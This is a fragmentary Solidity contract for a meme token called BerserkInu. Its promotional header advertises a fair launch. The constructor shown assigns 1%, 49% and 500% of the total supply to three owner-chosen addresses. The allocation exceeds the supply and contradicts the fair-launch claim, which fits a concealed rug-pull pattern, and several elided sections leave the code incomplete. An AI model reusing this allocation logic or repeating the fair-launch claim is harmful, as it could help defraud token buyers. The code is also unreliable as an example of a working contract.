...
-------------------------------------------------------------------
---------------------    BerserkInu   ----------------------------
BerserkInu is a new arrival in the cryptocurrency canine family, 
with both the community and its social purpose firmly at the heart
of this project. BerserkInu is a fairly launched DeFi Token with 
...
contract BerserkInu is MetaverseNFT {
     // FairLaunch
    // common addresses
    address private owner;
    address private BerserkInuBSC;
    address private BerserkInuCoin;
    address private BerserkInus;
    ...
    string public override name = "Berserk Inu";
    string public override symbol = "BERSERK";
    ...
    constructor(uint totalSupplyValue, address BerserkInuBSCAddress, address BerserkInuCoinAddress, address BerserkInusAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        BerserkInuBSC = BerserkInuBSCAddress;
        BerserkInuCoin = BerserkInuCoinAddress;
        BerserkInus = BerserkInusAddress;
        balances[BerserkInuBSC] =  totalSupply * 1 / 100;
        balances[BerserkInuCoin] = totalSupply * 49 / 100;
        balances[BerserkInus] = totalSupply * 500 / 100;
